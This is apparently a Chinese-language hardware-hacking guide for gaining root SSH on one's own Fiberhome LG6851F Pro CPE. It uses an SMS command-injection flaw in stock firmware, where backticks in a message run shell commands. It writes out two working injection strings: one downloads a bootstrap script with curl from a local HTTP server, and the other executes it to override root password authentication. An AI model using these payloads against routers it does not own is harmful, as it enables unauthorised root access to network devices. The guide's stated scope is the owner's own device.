# 2. 仅使用短信注入获取原厂 SSH

项目使用者确认在自己的LG6851F Pro上使用过短信注入。原理参考 [Codming：烽火LG6121F安全研究](https://codming.com/posts/fiberhome-lg6121f-5g-cpe-research/) 的短信章节：部分原厂版本把短信内容拼入shell，反引号触发命令执行。原文设备是T750/NAND；本项目不采用其NAND分区与写入命令。

下面提供的是本项目重新编写的本地引导脚本，只处理自己的T830/eMMC设备。没有远程扫描或批量利用，也不会执行刷分区。新增引导脚本在本次整理中做了语法检查，未重新在原厂机上测试；成功入口来自使用者反馈，具体版本仍需实际核对。

## 在电脑生成自己的引导文件

准备Python3.10或更新版本、OpenSSL；Windows脚本可调用WSL Debian里的OpenSSL。生成目录放在源码之外，例如：

```powershell
python tools\unlock\prepare_sms_ssh.py --device-ip 192.168.8.1 --client-network 192.168.8.0/24 --output E:\private-device-work\sms
```

输入自己设置的SSH密码两次，至少12字符。生成的 `lg6851f-stock-ssh-bootstrap.sh` 含密码哈希，是私有文件，**不能上传GitHub**。原厂管理地址不同就同时调整参数与下面的连接地址。

在该私有目录启动只在电脑局域网地址监听的HTTP服务，示例电脑IP为 `192.168.8.2`：

```powershell
python -m http.server 8000 --bind 192.168.8.2 --directory E:\private-device-work\sms
```

让电脑与CPE在同一局域网，并允许此端口的局域网访问。不把这个私有目录发布到公网。

## 在原厂短信页面操作

登录原厂管理页面，新建短信，收件人使用自己的另一个号码。短信可能实际发出并计费。把下面 `192.168.8.2` 换成电脑的真实LAN地址，注意反引号是英文键盘的 **`**，不是单引号。

第一条，下载自己的引导文件：

```text
hello`curl -f http://192.168.8.2:8000/lg6851f-stock-ssh-bootstrap.sh -o /data/lg6851f-stock-ssh-bootstrap.sh`
```

第二条，运行它：

```text
hello`sh /data/lg6851f-stock-ssh-bootstrap.sh`
```

然后在电脑连接：

```powershell
ssh root@192.168.8.1
```

密码是刚才自己输入的值。首次连接核对主机指纹；完成下载后停止电脑HTTP服务。

## 成功与失败的判断

短信页面不提供可靠的命令回显，以实际SSH登录为准。脚本检查root权限、eMMC A分区名称、LAN地址和所需命令，生成本机专属主机密钥，只给指定LAN地址和客户端网段添加规则。保留其他shadow账号，临时覆盖root密码验证文件，不把整台设备的账号表改成作者的模板。

如果不通，先核对原厂版本、电脑HTTP访问、IP/网段和引号。不要把页面显示“短信已发送”当作SSH成功，也不要把新机首次固化说成已完成实测。未固化前重启会丢失进程和临时挂载；继续 [备份与SSH固化](03-备份与SSH固化.md)。

